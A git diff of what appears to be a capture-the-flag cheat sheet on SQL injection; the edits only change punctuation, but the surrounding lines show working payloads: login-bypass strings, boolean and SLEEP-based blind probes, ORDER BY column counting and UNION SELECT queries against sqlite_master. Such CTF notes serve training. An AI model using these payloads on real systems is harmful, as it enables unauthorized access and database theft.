@@ -4,7 +4,7 @@ category: WEB
 tags: [sqli, sql-injection, union, union-based, auth-bypass, login-bypass, sqlmap, boolean-blind, order-by, information-schema]
 tools: [sqlmap]
 manuals: ["Manuals/sqlmap/3. Contexto para Claude.md"]
-title: "SQL injection — auth bypass + UNION + sqlmap"
+title: "SQL injection: auth bypass + UNION + sqlmap"
 difficulty: medium
 created: 2026-10-04
 updated: 2026-10-04
@@ -17,7 +17,7 @@ related: [generic-recon-scanner]
   (`You have an error in your SQL syntax`) is immediate confirmation.
 - A behavior change between `' OR '1'='1` and `' AND '1'='2` (boolean-based), or a timing difference
   with `SLEEP(5)` (time-based blind).
-- The flag is usually in a table (`flag`, `secret`, `users`) — not on the filesystem.
+- The flag is usually in a table (`flag`, `secret`, `users`), not on the filesystem.
 
 ## Method
 
@@ -28,7 +28,7 @@ user: admin'--                     (comments out the rest of the query)
 user: ' OR 1=1 LIMIT 1 --
 ```
 
-### 2. UNION-based (extract data) — manual, fast
+### 2. UNION-based (extract data): manual, fast
 ```sql
 -- find the number of columns (increment until it stops erroring):
 ' ORDER BY 1--   ' ORDER BY 2--   ... ' ORDER BY N--
@@ -53,7 +53,7 @@ See `Manuals/sqlmap/3. Contexto para Claude.md` for `--level/--risk`, `--techniq
 
 - Identify the **DBMS** before enumerating the schema: MySQL/MariaDB uses `information_schema`; SQLite
   uses `sqlite_master` (`' UNION SELECT name,sql FROM sqlite_master--`); Postgres differs in casting/quoting.
-- `UNION SELECT` requires the **same number and compatible types** of columns — that's why `ORDER BY`
+- `UNION SELECT` requires the **same number and compatible types** of columns; that's why `ORDER BY`
   comes first. Use `NULL` for columns whose type you don't know.
 - If nothing reflects on the page but the behavior changes → blind (boolean/time); there sqlmap beats
   doing it by hand by a mile.
@@ -62,5 +62,5 @@ See `Manuals/sqlmap/3. Contexto para Claude.md` for `--level/--risk`, `--techniq
 
 ## Cross-reference
 
-- `Manuals/sqlmap/3. Contexto para Claude.md` — full automation.
-- `generic-recon-scanner` — find the vulnerable endpoint first.
+- `Manuals/sqlmap/3. Contexto para Claude.md`: full automation.
+- `generic-recon-scanner`: find the vulnerable endpoint first.
